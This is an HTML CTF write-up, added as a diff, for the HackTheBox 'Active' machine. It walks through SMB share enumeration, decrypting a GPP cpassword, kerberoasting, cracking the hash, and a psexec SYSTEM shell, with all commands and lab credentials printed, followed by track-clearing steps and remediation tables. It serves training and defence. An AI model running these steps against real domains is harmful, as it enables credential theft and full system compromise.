@@ -1,0 +1,766 @@
+
+  
+    
+    <title>
+      HackTheBox - Active (Easy)
+    </title>
+    
+  
+  
+    
+      <header>
+<div class="header"><img src="https://www.notion.so/images/page-cover/gradients_5.png" class="headerImage"/>
+<img class="headerIcon" src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Active/icon.png"/>
+<h1 class="mainTitle">
+          HackTheBox - Active (Easy)
+        </h1 class="mainTitle">
+</div></header>
+      <div class="writeUp">
+        <h1 id="de395289-0232-4d1f-a606-45992ca88911">
+          Table of contents
+        </h1>
+        <nav id="1cf3ad68-8a20-4eb6-8445-4ddd2aba8cf6">
+          <div>
+            <a href="#de395289-0232-4d1f-a606-45992ca88911">
+              Table of contents
+            </a>
+          </div>
+          <div>
+            <a href="#ffa88963-fba8-4e0b-b19c-a83cf1538f76">
+              Enumeration
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#727df77d-1b26-493c-8bbf-525192925ab8">
+              
+                Nmap scan
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#a98af71b-9c25-4c2b-8b0b-351133027cf3">
+              
+                SMB enumeration
+              
+            </a>
+          </div>
+          <div>
+            <a href="#b2bfcbd3-af29-4d22-904d-eadaa9ae469c">
+              Initial access
+            </a>
+          </div>
+          <div>
+            <a href="#2066e4f9-4719-4951-aa25-3e2cef5d67fd">
+              Clearing tracks
+            </a>
+          </div>
+          <div>
+            <a href="#798fb451-5eaf-4a9d-b95d-11076e4b1b3e">
+              Vulnerabilities summary
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#b58235ba-3ae5-4e56-9e37-1f9a1ea9bd58">
+              
+                Permissions misconfiguration
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#bc04ed7a-b122-4ce5-ab7f-c024464da5ef">
+              
+                Kerberoasting
+              
+            </a>
+          </div>
+          <div>
+            <a href="#df54334e-cdbd-4c4b-8da3-350c6a4c424f">
+              Tools used
+            </a>
+          </div>
+          <div>
+            <a href="#e15a9816-aed0-4033-a15c-ce9a81907685">
+              Sources
+            </a>
+          </div>
+        </nav>
+        <h1 id="ffa88963-fba8-4e0b-b19c-a83cf1538f76">
+          Enumeration
+        </h1>
+        <h2 id="727df77d-1b26-493c-8bbf-525192925ab8">
+          
+            Nmap scan
+          
+        </h2>
+        
+        
+        
+<pre id="28393d0c-6bde-411e-a8fb-c5142ac386f5" class="code"><code># Nmap 7.93 scan initiated Thu Jun  8 13:16:29 2023 as: nmap -A -p- -oN nmapResults.txt -v 10.10.10.100
+Nmap scan report for 10.10.10.100
+Host is up (0.029s latency).
+Not shown: 65512 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-08 17:17:02Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+49168/tcp open  msrpc         Microsoft Windows RPC
+49169/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   210: 
+|_    Message signing enabled and required
+|_clock-skew: -2s
+| smb2-time: 
+|   date: 2023-06-08T17:17:57
+|_  start_date: 2023-06-08T15:05:46
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jun  8 13:18:06 2023 -- 1 IP address (1 host up) scanned in 97.44 seconds</code></pre>
+        <h2 id="a98af71b-9c25-4c2b-8b0b-351133027cf3">
+          
+            SMB enumeration
+          
+        </h2>
+        <p id="99b43abf-a10a-4bc2-97a4-8710f535b3f1">
+          Let’s enumerate the SMB service. First, we can try to list available SMB shares :
+        </p>
+        
+        
+        
+<pre id="bcb718b3-b8f0-4f7f-9385-52de55dd354a" class="code"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Active]
+└─$ smbclient -L //10.129.140.103/
+Password for [WORKGROUP\kali]:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Replication     Disk      
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.140.103 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available</code></pre>
+        <p id="db31bfa8-1fe0-49bc-a4ce-43d987c6f668">
+          We only have access to the 
+          <code>
+            Replication
+          </code>
+           share for now. Let’s connect to it : 
+        </p>
+        
+        
+        
+<pre id="dbf488a1-021c-4289-a598-907ceb7680ca" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Easy/Active/loot]
+└─$ smbclient //10.129.140.103/Replication
+Password for [WORKGROUP\kali]:
+Anonymous login successful
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sat Jul 21 06:37:44 2018
+  ..                                  D        0  Sat Jul 21 06:37:44 2018
+  active.htb                          D        0  Sat Jul 21 06:37:44 2018
+
+                5217023 blocks of size 4096. 247247 blocks available
+smb: \&gt;</code></pre>
+        <p id="1c7e2197-ba5a-46b1-9b2b-018e742853a4">
+          So, we have a domain name. Let’s gather all the files recursively : 
+        </p>
+        
+        
+        
+<pre id="d54d6428-5912-4050-9f36-9136c43e6df9" class="code"><code>smb: \&gt; prompt
+smb: \&gt; recurse
+smb: \&gt; mget *
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (1.1 KiloBytes/sec) (average 0.5 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (25.2 KiloBytes/sec) (average 6.7 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (4.3 KiloBytes/sec) (average 6.2 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (6.6 KiloBytes/sec) (average 6.3 KiloBytes/sec)
+getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (31.3 KiloBytes/sec) (average 9.8 KiloBytes/sec)</code></pre>
+        <p id="f102af1b-6cda-4bcb-b3e2-cbe47e0fa582">
+          It seems that 
+          <code>
+            Replication
+          </code>
+           is a replication of the 
+          <code>
+            SYSVOL
+          </code>
+           SMB share. It is used to store 
+        </p>
+        <ul id="084260eb-5c67-441f-849e-29b6e9638a8f">
+          <li>
+            GPTs (Group Policy Templates)
+          </li>
+        </ul>
+        <ul id="87b7433e-2cc5-475e-9d23-000374f3837d">
+          <li>
+            Scripts
+          </li>
+        </ul>
+        <ul id="96245647-3ed8-4c7c-ac44-c6df0edf8f40">
+          <li>
+            Junction points
+          </li>
+        </ul>
+        <p id="8c65dfd4-cb3d-4e26-98e8-cd32c23fbdf5">
+          In 
+          <code>
+            active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
+          </code>
+          , there is a 
+          <code>
+            Groups.xml
+          </code>
+           file. This file contains group policies.
+        </p>
+        <p id="53d5f737-9057-4980-9c5c-9968fd9b36d7">
+          Let’s take a look at it : 
+        </p>
+        
+        
+        
+<pre id="f32180ee-d8f9-464c-ad3a-44dd5211043e" class="code"><code>┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
+└─$ cat Groups.xml 
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;
+&lt;/Groups&gt;</code></pre>
+        <p id="a9972528-3748-4221-a4da-feada03f1de3">
+          It contains a username and an encoded password : 
+          <code>
+            active.htb\SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+          </code>
+        </p>
+        <p id="01e9fb18-c13e-45f8-9e73-6fff0a430db6">
+          Let’s decode this password : 
+        </p>
+        
+        
+        
+<pre id="186e7980-f417-47fc-812a-014507f5194d" class="code"><code>┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
+└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+GPPstillStandingStrong2k18</code></pre>
+        <h1 id="b2bfcbd3-af29-4d22-904d-eadaa9ae469c">
+          Initial access
+        </h1>
+        <p id="2dd4b875-2202-4e4a-95c4-e59ea1502883">
+          Now, we have the password for user 
+          <code>
+            SVC_TGS
+          </code>
+          . According to it’s account name, we could be able to use it to retrieve 
+          
+            
+              service tickets
+            
+          
+           from the 
+          
+            
+              Kerberos
+            
+          
+           service and perform a 
+          
+            
+              kerberoasting attack
+            
+          
+          . 
+        </p>
+        <p id="f01eda51-43b8-4962-884f-38346deadb58">
+          First, we need to add the domain to our 
+          <code>
+            /etc/hosts
+          </code>
+           file : 
+        </p>
+        
+        
+        
+<pre id="cdd010ae-16e3-4af2-b782-620bf537daad" class="code"><code>┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
+└─$ cat /etc/hosts
+127.0.0.1       localhost       gitea.searcher.htb
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.129.140.103  active.htb</code></pre>
+        <p id="1ce417e3-8193-4759-a0b4-529d0d3b1ced">
+          Then, let’s try to retrieve 
+          
+            
+              SPNs (Service Principal Names)
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="1ea0323e-052b-4dac-9557-f466b1713483" class="code"><code>┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
+└─$ impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-07-18 12:06:31.350147</code></pre>
+        <p id="bb741ef5-cd04-409f-a6c7-93deb1af7fc3">
+          So, we can retrieve a service ticket for the 
+          <code>
+            Administrator
+          </code>
+           user account. This way, we can try to crack his password. Let’s request a 
+          
+            
+              service ticket
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="1bd4bace-8aca-438c-92c0-8f777937f244" class="code"><code>┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
+└─$ impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -request
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-07-18 12:06:31.350147             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$f6f093902a777683c4f9021dbfdcbff2$65fe7fd1975a8b34a1680dff9ed15b53d8d5c4c2a6c84fd70150653f70010ce0027e20c88d9b081c6c9f9d97f2cb953be8b9d1f0a158b8dde1d6aee88c5ecfc15e661651f07aef6413e551cf695177266574bf426442ff5e1d8a27d193b01c6dbb28cb35d005a35b16958b33497d540360eb9754949a72d81cf467c424047cd79e4361901f89e2500c3e7b78990249350aeec8da7fb3b34be0870befa0c7192af6768c7d9ac884e577b74eaa4390356a1746b5be3fdc2d42abf07281e6640ce599e0ddc604d5a8841dc6d7985ef5bdc64a7f4831acd387f932707c318f6a4b0fc195cbff7928bc44b17b01e11bfa0efacafac0078adc760933b27917bb668e01f0fc03ff86476ab11873c3cb2a64e488522a099a57cc152f1ed4914a50230433a288f0f827648e2667d30bacf09099279b45e432db3cf1b7e191dda1488b470a4575918ef3fc22584495baec6b52977c6a6a12ea9e2618680ab4df85702fdbac6a8613d0ecf95035877c9464e61c57056b117dbd3a96adad1b5e05df9b45384211b488d60fa69f4de04ee8adfe22e04ff0d2299ca95bb3f1d6b1a2aaa9f9c0a78af0ebaaf89b3709dff039fa053223ae7c229f12cf43ed2ae8931261fb1d261b2de67b4892813a6fac9209ed84e0361aaccf90983df82c33857ab7785e2f7d4a7667f3f512e875b8674dd61e404f6d30955b9661d2e803d77648720a373eb4ab757fdc934823e2cc03f9c0d5ed86733185c05428e8b9be4da355c7701fb45c99f326f02207a237e6d1227167e0c60f37de556162deda95cde2c68ab55d544586dba7f306216bbef6d34b13489645716bd7d9c5e4d9ca6eedd2ac7a2caea6a9db5ba2f27d03fd63ce803f3c01c9e51cb2bf9022f0bbba50bdb71a83f9c9055f8a16a269ac59bd7467c0fce20885c1887bb24c3b1e6f99fa05ed5c68ef17d7e81fce4f57d8aae12e3647a51db4451d227d01bf07639cdebccc6589af134e2e9c8c0c99ae678ba83f78d9acaf020013846d4e48515254c4cba8d393327e63b93eb1d756a9f90370ce31266774eead44cdce7a1f908540fe4bb2e97435c9840976b03fc35f6b9a4883a331f8dbb3e32f17527da487f8673445a89c17604f6b1c2a490a7bf8dcd45f7e4040bac9ba6cb860247dd65548235c5f6878e7cc9b71376971e591dbc89d54ed6c540e10477a8e507b28ac477852ef4682ce670d609f6486965db9c3401672019a4508a68947c50142c6ebac617891cd74bf30</code></pre>
+        <p id="a30a4257-e4d2-487f-ad02-6f8a1ca8be6a">
+          Now, we can save this in a file and try to crack it using 
+          <a href="https://www.openwall.com/john/">
+            John
+          </a>
+           : 
+        </p>
+        
+        
+        
+<pre id="e2f8b755-49af-4cff-be72-7e0489f72a4f" class="code"><code>┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+Ticketmaster1968 (?)     
+1g 0:00:00:06 DONE (2023-07-18 12:37) 0.1543g/s 1626Kp/s 1626Kc/s 1626KC/s Tiffani1432..Thrash1
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</code></pre>
+        <p id="6b94fe9c-4508-4dc9-8471-22d19326865e">
+          Now, we have the password for the 
+          <code>
+            Administrator
+          </code>
+           account.
+        </p>
+        <p id="f08c7979-fd8f-4823-8601-03d870d6b0e8">
+          Since RDP, WinRM or SSH are not open, we can try to use 
+          <a href="https://github.com/fortra/impacket/blob/impacket_0_9_24/examples/psexec.py">
+            psexec
+          </a>
+           to gain a shell on the system :
+        </p>
+        
+        
+        
+<pre id="f948c6df-1301-4f21-b58a-5a003e1edf76" class="code"><code>┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
+└─$ impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on active.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file QzdvFckk.exe
+[*] Opening SVCManager on active.htb.....
+[*] Creating service xJmB on active.htb.....
+[*] Starting service xJmB.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system</code></pre>
+        <p id="195061cf-d8dc-4d9b-8e6f-e99457ef57d0">
+          We now have a shell as 
+          <code>
+            NT AUTHORITY\SYSTEM
+          </code>
+          .
+        </p>
+        <h1 id="2066e4f9-4719-4951-aa25-3e2cef5d67fd">
+          Clearing tracks
+        </h1>
+        <ul id="6ffc2c5a-33e6-4b4d-8ae1-ab79fb24a890">
+          <li>
+            Remove 
+            <code>
+              QzdvFckk.exe
+            </code>
+             from the 
+            <code>
+              ADMIN$
+            </code>
+             SMB share.
+          </li>
+        </ul>
+        <ul id="56b8554e-eb01-4351-a8fd-bdfa46318dc0">
+          <li>
+            Remove 
+            <code>
+              xJmB
+            </code>
+             service using 
+            <code>
+              sc.exe delete xJmB
+            </code>
+          </li>
+        </ul>
+        <h1 id="798fb451-5eaf-4a9d-b95d-11076e4b1b3e">
+          Vulnerabilities summary
+        </h1>
+        <h2 id="b58235ba-3ae5-4e56-9e37-1f9a1ea9bd58">
+          
+            Permissions misconfiguration
+          
+        </h2>
+        <table id="21362f9e-bb90-4e3d-8501-9dba86cddd34">
+          <thead>
+            <tr id="dd34f2dd-cd78-4eb7-a937-494375bef8e9">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="6f6e0625-8e32-4c7b-908e-74f5d1650069">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                SMB Replication share
+              </td>
+            </tr>
+            <tr id="6f9ed87f-6e3d-4244-a80a-2168b6432e0a">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  7.5
+                
+              </td>
+            </tr>
+            <tr id="3bc44f47-835c-457a-a870-fda8cb04b4a2">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  HIGH
+                
+              </td>
+            </tr>
+            <tr id="75395628-3e61-484c-98e4-9acaf7851c11">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="cb8fa0d7-e816-4ae0-8a71-b508c096de76">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to access sensitive files containing credentials which can then be used to perform other Active Directory based attacks.
+                
+                  
+                  
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                   
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="2ebe5e82-943a-462d-9367-6807032eba28">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Configure the 
+                <code>
+                  Replication
+                </code>
+                 SMB share to only be accessible by domain administrators.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="bc04ed7a-b122-4ce5-ab7f-c024464da5ef">
+          
+            Kerberoasting
+          
+        </h2>
+        <table id="ab9c2757-ee3c-4058-b10c-2ebaac17a64a">
+          <thead>
+            <tr id="98ea5ffb-3a7a-47fc-ba09-7a5a9040470e">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="10470ee2-09be-4fe2-b846-445ecc4f2819">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                Domain controller
+              </td>
+            </tr>
+            <tr id="e8955cb3-9352-4fb3-8222-fd7bfd9b5114">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  9.8
+                
+              </td>
+            </tr>
+            <tr id="4140075a-d2b6-42e3-8b62-ddf0fc2db933">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  CRITICAL
+                
+              </td>
+            </tr>
+            <tr id="053b05fd-c6df-4f90-9d3e-e76838de01ac">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="365350db-dfd3-4ede-a1ac-025d2511cee2">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to crack service tickets in order to retrieve the password for other user accounts. In this case, it is a critical vulnerability since an attacker can retrieve the 
+                <code>
+                  Administrator
+                </code>
+                 password and gain full control over the domain controller.
+                
+                  
+                  
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    availability
+                  
+                
+                
+                   and 
+                
+                
+                  
+                    integrity
+                  
+                
+                
+                   
+                
+                of the entire system.
+              </td>
+            </tr>
+            <tr id="6f701e5c-fa71-49a5-9f80-3d5b6034c327">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Use stronger passwords. You can put in place password policies to force users to use stronger passwords.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="df54334e-cdbd-4c4b-8da3-350c6a4c424f">
+          Tools used
+        </h1>
+        <table id="6748bfc5-194f-42f2-817b-b990685f7f86">
+          <thead>
+            <tr id="3b62a365-9d3d-4955-8a2f-3d451f6fa2af">
+              <th id="`&gt;MF">
+                Tool
+              </th>
+              <th id="A|qY">
+                Purpose
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="15b45fd8-727d-4d8a-b8fa-1ff3ec20e6bc">
+              <td id="`&gt;MF">
+                <a href="https://nmap.org/book/man.html">
+                  Nmap
+                </a>
+              </td>
+              <td id="A|qY">
+                - Scan for open ports
+                
+                - Scan services versions
+                
+              </td>
+            </tr>
+            <tr id="2736c912-d6ad-4fab-bc97-f6d4eb201abc">
+              <td id="`&gt;MF">
+                <a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">
+                  Smbclient
+                </a>
+              </td>
+              <td id="A|qY">
+                - Connect and interact with the SMB shares
+              </td>
+            </tr>
+            <tr id="1600c1b8-fbae-4755-afd1-b6b8c59ca027">
+              <td id="`&gt;MF">
+                <a href="https://www.openwall.com/john/">
+                  John
+                </a>
+              </td>
+              <td id="A|qY">
+                - Crack hashes
+              </td>
+            </tr>
+            <tr id="f98c80b3-216b-417c-b99a-2a5248abdeda">
+              <td id="`&gt;MF">
+                <a href="https://tools.thehacker.recipes/impacket/examples/getuserspns.py">
+                  impacket-GetUserSPNs
+                </a>
+              </td>
+              <td id="A|qY">
+                - Gather SPNs and retrieve service tickets
+              </td>
+            </tr>
+            <tr id="f8fd1327-01dc-488c-a077-a96f41019d5b">
+              <td id="`&gt;MF">
+                <a href="https://github.com/fortra/impacket/blob/impacket_0_9_24/examples/psexec.py">
+                  impacket-psexec
+                </a>
+              </td>
+              <td id="A|qY">
+                - Gain a shell on the system
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="e15a9816-aed0-4033-a15c-ce9a81907685">
+          Sources
+        </h1>
+        <ul id="0d5e57d8-d59d-44b0-91c0-99d48c742b14">
+          <li>
+            Kerberoasting : 
+            <a href="https://beta.hackndo.com/kerberoasting/">
+              https://beta.hackndo.com/kerberoasting/
+            </a>
+          </li>
+        </ul>
+        <ul id="8ae6091a-c10d-442b-a1f5-1eb335beab4b">
+          <li>
+            Groups.xml exploitation : 
+            <a href="https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp">
+              https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp
+            </a>
+          </li>
+        </ul>
+      </div>
+    
+    <span>
+    </span>
+  
+
